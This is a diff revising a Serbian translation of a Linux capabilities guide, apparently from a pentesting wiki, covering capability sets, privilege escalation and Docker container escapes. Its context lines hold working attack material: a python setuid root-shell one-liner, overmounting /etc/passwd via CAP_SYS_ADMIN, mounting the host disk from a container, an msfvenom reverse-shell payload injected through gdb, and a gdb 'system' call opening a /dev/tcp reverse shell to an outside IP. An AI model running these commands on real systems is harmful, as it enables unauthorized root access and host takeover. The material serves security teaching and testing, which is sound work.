@@ -5,42 +5,42 @@
 
 ## Linux Capabilities
 
-Linux capabilities dele **root privileges** na manje, zasebne jedinice, omogućavajući procesima da imaju podskup privilegija. Ovo umanjuje rizike jer se pune root privilegije ne dodeljuju nepotrebno.
+Linux capabilities dele **root privilegije na manje, zasebne jedinice**, omogućavajući procesima da imaju podskup privilegija. Ovo smanjuje rizike tako što se ne dodeljuju pune root privilegije kada to nije neophodno.<sup>[[5]](#references)</sup>
 
 ### Problem:
 
-- Normalni korisnici imaju ograničene dozvole, što utiče na zadatke poput otvaranja mrežnog soketa, za šta je potreban root pristup.
+- Normalni korisnici imaju ograničene dozvole, što utiče na zadatke kao što je otvaranje mrežnog socket-a, za šta je potreban root pristup.
 
 ### Skupovi capabilities:
 
 1. **Inherited (CapInh)**:
 
 - **Svrha**: Određuje capabilities koje se prenose sa roditeljskog procesa.
-- **Funkcionalnost**: Kada se kreira novi proces, on nasleđuje capabilities svog roditelja iz ovog skupa. Korisno je za održavanje određenih privilegija pri kreiranju novih procesa.
-- **Ograničenja**: Proces ne može dobiti capabilities koje njegov roditelj nije posedovao.
+- **Funkcionalnost**: Kada se kreira novi proces, on nasleđuje capabilities svog roditelja iz ovog skupa. Korisno za održavanje određenih privilegija tokom kreiranja novih procesa.
+- **Ograničenja**: Proces ne može dobiti capabilities koje njegov roditelj nije posedovao.<sup>[[3]](#references)</sup>
 
 2. **Effective (CapEff)**:
 
 - **Svrha**: Predstavlja stvarne capabilities koje proces koristi u datom trenutku.
-- **Funkcionalnost**: Ovo je skup koji kernel proverava da bi odobrio dozvole za različite operacije. Kod fajlova, ovaj skup može biti indikator da li capabilities dozvoljene za fajl treba smatrati efektivnim.
-- **Značaj**: Effective skup je ključan za neposredne provere privilegija i predstavlja aktivni skup capabilities koje proces može koristiti.
+- **Funkcionalnost**: Ovo je skup capabilities koje kernel proverava kako bi odobrio dozvolu za različite operacije. Kod fajlova, ovaj skup može biti indikator da li capabilities dozvoljene za fajl treba smatrati efektivnim.
+- **Značaj**: Efektivni skup je ključan za trenutne provere privilegija i predstavlja aktivni skup capabilities koje proces može da koristi.
 
 3. **Permitted (CapPrm)**:
 
 - **Svrha**: Definiše maksimalni skup capabilities koje proces može posedovati.
-- **Funkcionalnost**: Proces može prebaciti capability iz permitted skupa u effective skup, čime dobija mogućnost da je koristi. Takođe može ukloniti capabilities iz svog permitted skupa.
-- **Granica**: Deluje kao gornja granica capabilities koje proces može imati, sprečavajući ga da prekorači unapred definisani opseg privilegija.
+- **Funkcionalnost**: Proces može podići capability iz permitted skupa u svoj effective skup, čime dobija mogućnost da koristi tu capability. Takođe može ukloniti capabilities iz svog permitted skupa.
+- **Granica**: Funkcioniše kao gornja granica capabilities koje proces može imati, čime se osigurava da proces ne prekorači unapred definisan opseg privilegija.
 
 4. **Bounding (CapBnd)**:
 
-- **Svrha**: Postavlja gornju granicu capabilities koje proces ikada može steći tokom svog životnog ciklusa.
-- **Funkcionalnost**: Čak i ako proces ima određenu capability u svom inheritable ili permitted skupu, ne može je steći osim ako se ona takođe nalazi u bounding skupu.
-- **Slučaj upotrebe**: Ovaj skup je posebno koristan za ograničavanje potencijala procesa za eskalaciju privilegija i dodaje dodatni sloj bezbednosti.
+- **Svrha**: Postavlja plafon capabilities koje proces ikada može dobiti tokom svog životnog ciklusa.
+- **Funkcionalnost**: Čak i ako proces ima određenu capability u svom inheritable ili permitted skupu, ne može dobiti tu capability osim ako se ona takođe nalazi u bounding skupu.
+- **Slučaj upotrebe**: Ovaj skup je naročito koristan za ograničavanje potencijala procesa za eskalaciju privilegija, dodajući dodatni sloj bezbednosti.
 
 5. **Ambient (CapAmb)**:
-- **Svrha**: Omogućava da se određene capabilities zadrže tokom `execve` system call-a, koji bi obično doveo do potpunog resetovanja capabilities procesa.
-- **Funkcionalnost**: Obezbeđuje da programi koji nisu SUID i nemaju povezane file capabilities mogu zadržati određene privilegije.
-- **Ograničenja**: Capabilities u ovom skupu podležu ograničenjima inheritable i permitted skupova, čime se obezbeđuje da ne prekorače privilegije dozvoljene procesu.
+- **Svrha**: Omogućava da se određene capabilities održe tokom `execve` sistemskog poziva, koji bi obično doveo do potpunog resetovanja capabilities procesa.
+- **Funkcionalnost**: Osigurava da non-SUID programi koji nemaju povezane file capabilities mogu zadržati određene privilegije.
+- **Ograničenja**: Capabilities u ovom skupu podležu ograničenjima inheritable i permitted skupova, čime se osigurava da ne prekorače privilegije dozvoljene procesu.<sup>[[8]](#references)[[9]](#references)</sup>
 ```python
 # Code to demonstrate the interaction of different capability sets might look like this:
 # Note: This is pseudo-code for illustrative purposes only.
@@ -50,32 +50,27 @@ process.add_capability_to_set('CapPrm', 'new_capability')
 process.limit_capabilities('CapBnd')
 process.preserve_capabilities_across_execve('CapAmb')
 ```
-Za dodatne informacije pogledajte:
-
-- [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
-- [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
-
 ## Capabilities procesa i binarnih datoteka
 
 ### Capabilities procesa
 
 Da biste videli capabilities određenog procesa, koristite datoteku **status** u direktorijumu /proc. Pošto pruža više detalja, ograničimo prikaz samo na informacije povezane sa Linux capabilities.\
-Imajte na umu da se za sve pokrenute procese informacije o capabilities održavaju po niti, dok se za binarne datoteke u sistemu datoteka čuvaju u proširenim atributima.
+Imajte na umu da se za sve pokrenute procese informacije o capabilities održavaju po thread-u, dok se za binarne datoteke u sistemu datoteka čuvaju u proširenim atributima.<sup>[[4]](#references)</sup>
 
 Capabilities su definisane u /usr/include/linux/capability.h
 
-Capabilities trenutnog procesa možete pronaći pomoću `cat /proc/self/status` ili izvršavanjem komande `capsh --print`, a capabilities drugih korisnika u `/proc/<pid>/status`
+Capabilities trenutnog procesa možete pronaći pomoću `cat /proc/self/status` ili komande `capsh --print`, a capabilities drugih korisnika u `/proc/<pid>/status`
 ```bash
 cat /proc/1234/status | grep Cap
 cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
 ```
-Ova komanda bi na većini sistema trebalo da vrati 5 redova.
+Ova komanda bi na većini sistema trebalo da vrati 5 linija.
 
 - CapInh = Nasleđene capabilities
 - CapPrm = Dozvoljene capabilities
-- CapEff = Efektivne capabilities
+- CapEff = Aktivne capabilities
 - CapBnd = Bounding set
-- CapAmb = Skup ambient capabilities
+- CapAmb = Skup ambijentalnih capabilities
 ```bash
 #These are the typical capabilities of a root owned process (all)
 CapInh: 0000000000000000
@@ -84,7 +79,7 @@ CapEff: 0000003fffffffff
 CapBnd: 0000003fffffffff
 CapAmb: 0000000000000000
 ```
-Ovi heksadecimalni brojevi nemaju smisla. Korišćenjem uslužnog programa `capsh` možemo ih dekodirati u nazive capabilities.
+Ovi heksadecimalni brojevi nemaju smisla. Pomoću uslužnog programa capsh možemo ih dekodirati u nazive capabilities.
 ```bash
 capsh --decode=0000003fffffffff
 0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
@@ -101,11 +96,11 @@ CapAmb:    0000000000000000
 capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
-Iako to funkcioniše, postoji još jedan i lakši način. Da biste videli capabilities pokrenutog procesa, jednostavno koristite alat **getpcaps**, nakon čega navedite njegov ID procesa (PID). Takođe možete navesti listu ID-jeva procesa.
+Iako to funkcioniše, postoji još jedan i jednostavniji način. Da biste videli capabilities pokrenutog procesa, jednostavno koristite alat **getpcaps** nakon kog navedete ID procesa (PID). Takođe možete navesti listu ID-jeva procesa.
 ```bash
 getpcaps 1234
 ```
-Hajde da ovde proverimo mogućnosti `tcpdump` nakon što smo binarnoj datoteci dodelili dovoljne capabilities (`cap_net_admin` i `cap_net_raw`) za njuškanje mreže (_tcpdump se pokreće u procesu 9562_):
+Proverimo ovde capabilities programa `tcpdump` nakon što su binarnoj datoteci dodeljene dovoljne capabilities (`cap_net_admin` i `cap_net_raw`) za sniffing mreže (_tcpdump se izvršava u procesu 9562_):
 ```bash
 #The following command give tcpdump the needed capabilities to sniff traffic
 $ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
@@ -124,22 +119,22 @@ $ capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
 Kao što možete videti, date capabilities odgovaraju rezultatima 2 načina za dobijanje capabilities binarnog fajla.\
-Alat _getpcaps_ koristi sistemski poziv **capget()** da upita dostupne capabilities za određenu nit. Ovaj sistemski poziv zahteva samo PID kako bi dobio više informacija.
+Alat _getpcaps_ koristi sistemski poziv **capget()** da ispita dostupne capabilities za određenu nit. Ovaj sistemski poziv zahteva samo PID da bi dobio više informacija.
 
-### Capabilities binarnih datoteka
+### Capabilities binarnih fajlova
 
-Binarne datoteke mogu imati capabilities koje se mogu koristiti tokom izvršavanja. Na primer, veoma je često pronaći `ping` binarnu datoteku sa `cap_net_raw` capability:
+Binarni fajlovi mogu imati capabilities koje se mogu koristiti tokom izvršavanja. Na primer, veoma je uobičajeno pronaći binarni fajl `ping` sa capability `cap_net_raw`:
 ```bash
 getcap /usr/bin/ping
 /usr/bin/ping = cap_net_raw+ep
 ```
-Možete **pretražiti binarne datoteke sa capabilities** koristeći:
+Možete **pretražiti binarne datoteke sa capabilities** pomoću:
 ```bash
 getcap -r / 2>/dev/null
 ```
 ### Uklanjanje capabilities pomoću capsh
 
-Ako uklonimo CAP*NET_RAW capabilities za \_ping*, ping alat više ne bi trebalo da radi.
+Ako uklonimo CAP*NET_RAW capabilities za _ping*, ping alat više ne bi trebalo da radi.
 ```bash
 capsh --drop=cap_net_raw --print -- -c "tcpdump"
 ```
@@ -147,7 +142,7 @@ Pored izlaza same komande _capsh_, i sama komanda _tcpdump_ bi trebalo da prika�
 
 > /bin/bash: /usr/sbin/tcpdump: Operation not permitted
 
-Greška jasno pokazuje da komandi ping nije dozvoljeno da otvori ICMP socket. Sada sa sigurnošću znamo da ovo funkcioniše kako je očekivano.
+Greška jasno pokazuje da komandi ping nije dozvoljeno da otvori ICMP socket. Sada sa sigurnošću znamo da ovo funkcioniše očekivano.
 
 ### Uklanjanje Capabilities
 
@@ -157,9 +152,9 @@ setcap -r </path/to/binary>
 ```
 ## Korisničke capabilities
 
-Očigledno je **moguće dodeliti capabilities i korisnicima**. To verovatno znači da će svaki proces koji korisnik izvrši moći da koristi capabilities tog korisnika.\
-Na osnovu [ovoga](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [ovoga ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) i [ovoga ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user), potrebno je konfigurisati nekoliko novih datoteka da bi se korisniku dodelile određene capabilities, ali datoteka koja dodeljuje capabilities svakom korisniku biće `/etc/security/capability.conf`.\
-Primer datoteke:
+Očigledno je **moguće dodeliti capabilities i korisnicima**. To verovatno znači da će svaki proces koji korisnik pokrene moći da koristi capabilities tog korisnika.\
+Na osnovu [ovoga](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [ovoga ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) i [ovoga ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user), potrebno je konfigurisati nekoliko novih fajlova da bi se korisniku dodelile određene capabilities, ali fajl koji dodeljuje capabilities svakom korisniku biće `/etc/security/capability.conf`.\
+Primer fajla:
 ```bash
 # Simple
 cap_sys_ptrace               developer
@@ -173,9 +168,9 @@ cap_net_admin,cap_net_raw    jrnetadmin
 # Combining names and numerics
 cap_sys_admin,22,25          jrsysadmin
 ```
-## Capabilities okruženja
+## Environment Capabilities
 
-Kompajliranjem sledećeg programa moguće je **pokrenuti bash shell unutar okruženja koje pruža capabilities**.
+Kompajliranjem sledećeg programa moguće je **pokrenuti bash shell unutar okruženja koje obezbeđuje capabilities**.
 ```c:ambient.c
 /*
 * Test program for the ambient capabilities
@@ -277,22 +272,22 @@ capsh --print
 Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
 ```
 > [!CAUTION]
-> Možete **dodati samo capabilities koje su prisutne** i u dozvoljenim i u nasledivim skupovima.
+> Možete **dodati samo capabilities koje su prisutne** u skupovima permitted i inheritable.
 
-### Capability-aware/Capability-dumb binaries
+### Capability-aware/Capability-dumb binarne datoteke
 
-**Capability-aware binaries neće koristiti nove capabilities** dobijene iz okruženja, dok će ih **capability-dumb binaries koristiti**, jer ih neće odbaciti. Zbog toga su capability-dumb binaries ranjive unutar posebnog okruženja koje dodeljuje capabilities binarnim datotekama.
+**Capability-aware binaries neće koristiti nove capabilities** koje im je dodelilo okruženje, dok će ih **capability-dumb binaries koristiti**, jer ih neće odbaciti. Zbog toga su capability-dumb binaries ranjivi unutar posebnog okruženja koje binarnim datotekama dodeljuje capabilities.
 
 ## Capabilities servisa
 
-Podrazumevano će **servis koji se izvršava kao root imati dodeljene sve capabilities**, što u nekim situacijama može biti opasno.\
+Podrazumevano, **servis koji se izvršava kao root imaće dodeljene sve capabilities**, što u nekim slučajevima može biti opasno.\
 Zato **konfiguracioni fajl servisa** omogućava da **navedete** capabilities koje želite da servis ima, kao i **korisnika** koji treba da izvršava servis, kako biste izbegli pokretanje servisa sa nepotrebnim privilegijama:
 ```bash
 [Service]
 User=bob
 AmbientCapabilities=CAP_NET_BIND_SERVICE
 ```
-## Capabilities u Docker kontejnerima
+## Capabilities u Docker Containers
 
 Docker podrazumevano dodeljuje nekoliko capabilities kontejnerima. Veoma je lako proveriti koje su to capabilities pokretanjem:
 ```bash
@@ -311,9 +306,9 @@ docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained 
 ```
 ## Privesc/Container Escape
 
-Capabilities su korisne kada **želite da ograničite sopstvene procese nakon obavljanja privilegovanih operacija** (npr. nakon podešavanja chroot okruženja i bindovanja na socket). Međutim, mogu se iskoristiti prosleđivanjem zlonamernih komandi ili argumenata koji se zatim izvršavaju kao root.
+Capabilities su korisne kada **želite da ograničite sopstvene procese nakon izvršavanja privilegovanih operacija** (npr. nakon podešavanja chroot-a i binding-a na socket). Međutim, mogu se iskoristiti prosleđivanjem zlonamernih komandi ili argumenata koji se zatim izvršavaju kao root.<sup>[[2]](#references)</sup>
 
-Capabilities možete nametnuti programima pomoću `setcap`, a zatim ih proveriti pomoću `getcap`:
+Capabilities možete nametnuti programima pomoću `setcap`, a možete ih proveriti pomoću `getcap`:
 ```bash
 #Set Capability
 setcap cap_net_raw+ep /sbin/ping
@@ -322,15 +317,15 @@ setcap cap_net_raw+ep /sbin/ping
 getcap /sbin/ping
 /sbin/ping = cap_net_raw+ep
 ```
-`+ep` znači da dodajete capability („-“ bi je uklonio) kao Effective i Permitted.
+`+ep` znači da dodajete capability („-” bi ga uklonio) kao Effective i Permitted.
 
-Da biste identifikovali programe na sistemu ili u fascikli koji imaju capabilities:
+Da biste identifikovali programe u sistemu ili fascikli sa capability-jima:
 ```bash
 getcap -r / 2>/dev/null
 ```
 ### Primer eksploatacije
 
-U sledećem primeru utvrđeno je da je binarni fajl `/usr/bin/python2.6` ranjiv na privesc:
+U sledećem primeru, binarni fajl `/usr/bin/python2.6` je ranjiv na privesc:
 ```bash
 setcap cap_setuid+ep /usr/bin/python2.7
 /usr/bin/python2.7 = cap_setuid+ep
@@ -338,7 +333,7 @@ setcap cap_setuid+ep /usr/bin/python2.7
 #Exploit
 /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
 ```
-**Capabilities** potrebne da bi `tcpdump` **omogućio bilo kom korisniku da snima pakete**:
+**Capabilities** potrebne da bi `tcpdump` **omogućio bilo kom korisniku da njuška pakete**:
 ```bash
 setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
 getcap /usr/sbin/tcpdump
@@ -346,30 +341,30 @@ getcap /usr/sbin/tcpdump
 ```
 ### Poseban slučaj „praznih“ capabilities
 
-[Iz dokumentacije](https://man7.org/linux/man-pages/man7/capabilities.7.html): Imajte na umu da je moguće dodeliti prazne capability skupove programskoj datoteci, pa je tako moguće kreirati set-user-ID-root program koji menja efektivni i sačuvani set-user-ID procesa koji izvršava program na 0, ali tom procesu ne dodeljuje capabilities. Ili, jednostavno rečeno, ako imate binary koji:
+[Iz dokumentacije](https://man7.org/linux/man-pages/man7/capabilities.7.html): Imajte na umu da se programskom fajlu mogu dodeliti prazni skupovi capabilities, pa je tako moguće kreirati set-user-ID-root program koji menja efektivni i sačuvani set-user-ID procesa koji izvršava program na 0, ali tom procesu ne dodeljuje capabilities. Ili, jednostavno rečeno, ako imate binary koji:
 
-1. nije u vlasništvu root korisnika
+1. nije u vlasništvu root-a
 2. nema postavljene `SUID`/`SGID` bitove
-3. ima prazan capabilities skup (npr.: `getcap myelf` vraća `myelf =ep`)
+3. ima prazan skup capabilities (npr.: `getcap myelf` vraća `myelf =ep`)
 
 onda će se **taj binary pokrenuti kao root**.
 
 ## CAP_SYS_ADMIN
 
-**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** je veoma moćan Linux capability, koji se često izjednačava sa gotovo root nivoom zbog svojih opsežnih **administrativnih privilegija**, kao što su montiranje uređaja ili manipulisanje kernel funkcijama. Iako je neophodan za kontejnere koji simuliraju čitave sisteme, **`CAP_SYS_ADMIN` predstavlja značajne bezbednosne izazove**, naročito u kontejnerizovanim okruženjima, zbog svog potencijala za eskalaciju privilegija i kompromitovanje sistema. Zbog toga njegova upotreba zahteva stroge bezbednosne procene i pažljivo upravljanje, uz snažnu preporuku da se ovaj capability ukloni iz application-specific kontejnera kako bi se poštovao **princip najmanjih privilegija** i smanjila attack surface.
+**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** je izuzetno moćna Linux capability, često izjednačavana sa nivoom skoro ekvivalentnim root-u zbog svojih širokih **administrativnih privilegija**, kao što su montiranje uređaja ili manipulisanje funkcijama kernela. Iako je neophodna za kontejnere koji simuliraju čitave sisteme, **`CAP_SYS_ADMIN` predstavlja značajne bezbednosne izazove**, naročito u kontejnerizovanim okruženjima, zbog svog potencijala za eskalaciju privilegija i kompromitovanje sistema. Zbog toga njena upotreba zahteva stroge bezbednosne procene i pažljivo upravljanje, uz snažnu preporuku da se ova capability ukloni iz application-specific kontejnera kako bi se poštovao **princip najmanjih privilegija** i smanjila attack surface.
 
 **Primer sa binaryjem**
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_admin+ep
 ```
-Koristeći Python možete montirati izmenjeni _passwd_ fajl preko stvarnog _passwd_ fajla:
+Pomoću pythona možete montirati izmenjeni _passwd_ fajl preko pravog _passwd_ fajla:
 ```bash
 cp /etc/passwd ./ #Create a copy of the passwd file
 openssl passwd -1 -salt abc password #Get hash of "password"
 vim ./passwd #Change roots passwords of the fake passwd file
 ```
-I na kraju **mount** izmenjenu `passwd` datoteku na `/etc/passwd`:
+I na kraju **mount**-ujte izmenjeni `passwd` fajl na `/etc/passwd`:
 ```python
 from ctypes import *
 libc = CDLL("libc.so.6")
@@ -382,11 +377,11 @@ options = b"rw"
 mountflags = MS_BIND
 libc.mount(source, target, filesystemtype, mountflags, options)
 ```
-I moći ćete da koristite **`su` kao root** koristeći lozinku „password“.
+I moći ćete da se **`su` kao root** koristeći lozinku „password“.
 
 **Primer sa okruženjem (Docker breakout)**
 
-Omogućene capabilities unutar Docker kontejnera možete proveriti pomoću:
+Možete proveriti omogućene capabilities unutar docker container-a pomoću:
 ```
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
@@ -399,11 +394,11 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-U prethodnom izlazu možete videti da je mogućnost SYS_ADMIN omogućena.
+Unutar prethodnog izlaza možete videti da je capability SYS_ADMIN omogućena.
 
 - **Mount**
 
-Ovo omogućava docker containeru da **montira disk hosta i slobodno mu pristupa**:
+Ovo omogućava Docker container-u da **montira disk hosta i da mu slobodno pristupa**:
 ```bash
 fdisk -l #Get disk name
 Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
@@ -415,10 +410,10 @@ mount /dev/sda /mnt/ #Mount it
 cd /mnt
 chroot ./ bash #You have a shell inside the docker hosts disk
 ```
-- **Potpun pristup**
+- **Potpuni pristup**
 
 U prethodnoj metodi uspeli smo da pristupimo disku docker hosta.\
-Ako ustanovite da host pokreće **ssh** server, mogli biste da **kreirate korisnika na disku docker hosta** i pristupite mu putem SSH-a:
+U slučaju da utvrdite da host pokreće **ssh** server, mogli biste da **kreirate korisnika na disku docker hosta** i pristupite mu putem SSH-a:
 ```bash
 #Like in the example before, the first step is to mount the docker host disk
 fdisk -l
@@ -434,9 +429,9 @@ ssh john@172.17.0.1 -p 2222
 ```
 ## CAP_SYS_PTRACE
 
-**To znači da možete pobeći iz kontejnera ubacivanjem shellcode-a u neki proces koji se izvršava unutar hosta.** Da bi pristupio procesima koji se izvršavaju unutar hosta, kontejner mora biti pokrenut najmanje sa **`--pid=host`**.
+**To znači da možete pobeći iz container-a ubacivanjem shellcode-a u neki proces koji se izvršava unutar host-a.** Da bi pristupio procesima koji se izvršavaju unutar host-a, container mora biti pokrenut najmanje sa **`--pid=host`**.
 
-**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** omogućava korišćenje funkcionalnosti za debugging i praćenje sistemskih poziva koje pružaju `ptrace(2)` i cross-memory attach pozivi kao što su `process_vm_readv(2)` i `process_vm_writev(2)`. Iako je moćan za potrebe dijagnostike i monitoringa, ako je `CAP_SYS_PTRACE` omogućen bez restriktivnih mera, kao što je seccomp filter nad `ptrace(2)`, može značajno ugroziti bezbednost sistema. Konkretno, može se iskoristiti za zaobilaženje drugih bezbednosnih ograničenja, naročito onih koja nameće seccomp, kao što je pokazano u [proofs of concept (PoC) primerima poput ovog](https://gist.github.com/thejh/8346f47e359adecd1d53).
+**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** omogućava korišćenje funkcionalnosti za debugging i praćenje sistemskih poziva koje pruža `ptrace(2)`, kao i cross-memory attach poziva poput `process_vm_readv(2)` i `process_vm_writev(2)`. Iako je moćan za potrebe dijagnostike i monitoringa, ako je `CAP_SYS_PTRACE` omogućen bez restriktivnih mera, kao što je seccomp filter nad `ptrace(2)`, može značajno ugroziti bezbednost sistema. Konkretno, može se iskoristiti za zaobilaženje drugih bezbednosnih ograničenja, naročito onih koje nameće seccomp, kao što je demonstrirano u [proofs of concept (PoC) poput ovog](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>
 
 **Primer sa binary (python)**
 ```bash
@@ -536,7 +531,7 @@ libc.ptrace(PTRACE_DETACH, pid, None, None)
 ```
 /usr/bin/gdb = cap_sys_ptrace+ep
 ```
-Kreirajte shellcode pomoću msfvenom-a za ubacivanje u memoriju putem gdb-a.
+Kreirajte shellcode pomoću msfvenom-a za ubacivanje u memoriju putem gdb-a
 ```python
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
 buf =  b""
@@ -560,7 +555,7 @@ chunks += f"{byte:02x}"
 
 print(f"set {{long}}($rip+{i}) = {chunks}")
 ```
-Debagujte root proces pomoću gdb-a i kopirajte-nalepite prethodno generisane gdb linije:
+Debugujte root proces pomoću gdb-a i copy-paste-ujte prethodno generisane gdb linije:
 ```bash
 # Let's write the commands to a file
 echo 'set {long}($rip+0) = 0x296a909090909090
@@ -583,21 +578,21 @@ Continuing.
 process 207009 is executing new program: /usr/bin/dash
 [...]
 ```
-**Primer sa okruženjem (Docker breakout) - Još jedna zloupotreba gdb-a**
+**Primer sa okruženjem (Docker breakout) - Another gdb Abuse**
 
-Ako je **GDB** instaliran (ili ga možete instalirati pomoću `apk add gdb` ili, na primer, `apt install gdb`), možete **debug-ovati proces sa hosta** i naterati ga da pozove funkciju `system`. (Ova tehnika takođe zahteva capability `SYS_ADMIN`)**.**
+Ako je **GDB** instaliran (ili ga možete instalirati pomoću `apk add gdb` ili, na primer, `apt install gdb`), možete **debug-ovati proces sa hosta** i naterati ga da pozove funkciju `system`. (Za ovu tehniku je takođe potrebna capability `SYS_ADMIN`)**.**
 ```bash
 gdb -p 1234
 (gdb) call (void)system("ls")
 (gdb) call (void)system("sleep 5")
 (gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
 ```
-Nećete moći da vidite izlaz izvršene komande, ali će je taj proces izvršiti (zato pribavite rev shell).
+Nećete moći da vidite izlaz izvršene komande, ali će je taj proces izvršiti (zato dobijte rev shell).
 
 > [!WARNING]
-> Ako dobijete grešku "No symbol "system" in current context.", pogledajte prethodni primer učitavanja shellcode-a u program preko gdb-a.
+> Ako dobijete grešku "No symbol "system" in current context.", pogledajte prethodni primer učitavanja shellcode-a u program putem gdb-a.
 
-**Primer sa okruženjem (Docker breakout) - Shellcode Injection**
+**Primer sa environment (Docker breakout) - Shellcode Injection**
 
 Omogućene capabilities unutar docker kontejnera možete proveriti pomoću:
 ```bash
@@ -612,46 +607,46 @@ uid=0(root)
 gid=0(root)
 groups=0(root
 ```
-Navedite **procese** koji se izvršavaju na **hostu** `ps -eaf`
+Izlistajte **procese** koji se izvršavaju na **hostu** `ps -eaf`
 
-1. Pronađite **arhitekturu** `uname -m`
-2. Pronađite **shellcode** za arhitekturu ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
+1. Utvrdite **architecture** `uname -m`
+2. Pronađite **shellcode** za datu architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
 3. Pronađite **program** za **inject** **shellcode-a** u memoriju procesa ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
 4. **Izmenite** **shellcode** unutar programa i **kompajlirajte** ga `gcc inject.c -o inject`
-5. Izvršite **inject** i preuzmite svoj **shell**: `./inject 299; nc 172.17.0.1 5600`
+5. **Inject-ujte** ga i preuzmite svoj **shell**: `./inject 299; nc 172.17.0.1 5600`
 
 ## CAP_SYS_MODULE
 
-**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** omogućava procesu da **učitava i uklanja kernel module (sistemski pozivi `init_module(2)`, `finit_module(2)` i `delete_module(2)`)**, pružajući direktan pristup osnovnim operacijama kernela. Ova capability predstavlja kritične bezbednosne rizike, jer omogućava eskalaciju privilegija i potpunu kompromitaciju sistema dozvoljavajući izmene kernela i zaobilaženje svih Linux bezbednosnih mehanizama, uključujući Linux Security Modules i izolaciju containera.
+**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** omogućava procesu da **učitava i uklanja kernel module (`init_module(2)`, `finit_module(2)` i `delete_module(2)` system calls)**, pružajući direktan pristup osnovnim operacijama kernela. Ova capability predstavlja kritične bezbednosne rizike jer omogućava escalation of privileges i potpunu kompromitaciju sistema dozvoljavajući izmene kernela, čime se zaobilaze svi Linux security mechanisms, uključujući Linux Security Modules i izolaciju kontejnera.<sup>[[6]](#references)</sup>
 **To znači da možete** **ubacivati/uklanjati kernel module u/iz kernela host mašine.**
 
-**Primer sa binarnim fajlom**
+**Primer sa binary-jem**
 
-U sledećem primeru binarni fajl **`python`** ima ovu capability.
+U sledećem primeru binary **`python`** ima ovu capability.
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_module+ep
 ```
-Podrazumevano, komanda **`modprobe`** proverava listu zavisnosti i map fajlove u direktorijumu **`/lib/modules/$(uname -r)`**.\
-Da bismo ovo zloupotrebili, kreirajmo lažni direktorijum **lib/modules**:
+Po podrazumevanim podešavanjima, komanda **`modprobe`** proverava listu zavisnosti i map datoteke u direktorijumu **`/lib/modules/$(uname -r)`**.\
+Da bismo ovo zloupotrebili, napravićemo lažni direktorijum **lib/modules**:
 ```bash
 mkdir lib/modules -p
 cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
 ```
-Zatim **kompajlirajte kernel module koji možete pronaći u 2 primera u nastavku i kopirajte** ga u ovaj folder:
+Zatim **kompajlirajte kernel module koji možete pronaći u 2 primera ispod i kopirajte** ga u ovaj folder:
 ```bash
